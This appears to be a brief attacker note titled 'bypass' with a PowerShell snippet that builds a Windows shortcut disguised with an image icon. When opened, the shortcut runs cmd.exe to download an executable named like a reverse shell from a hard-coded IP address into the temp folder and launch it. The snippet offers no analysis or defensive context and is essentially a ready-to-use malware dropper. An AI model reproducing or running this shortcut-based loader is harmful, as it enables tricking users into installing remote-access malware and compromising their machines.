# bypass
bypass
create lnk
    
    $s=New-Object -ComObject WScript.Shell
    $l=$s.CreateShortcut("$env:USERPROFILE\Desktop\links\test.lnk")
    $l.TargetPath = "cmd.exe"
    $l.Arguments = "/c curl -o %temp%\foto.exe http://100.100.31.64:8081/simplereshell1010.exe && start %temp%\foto.exe"
    $l.IconLocation = "%windir%\system32\imageres.dll, 100"
    $l.Save()
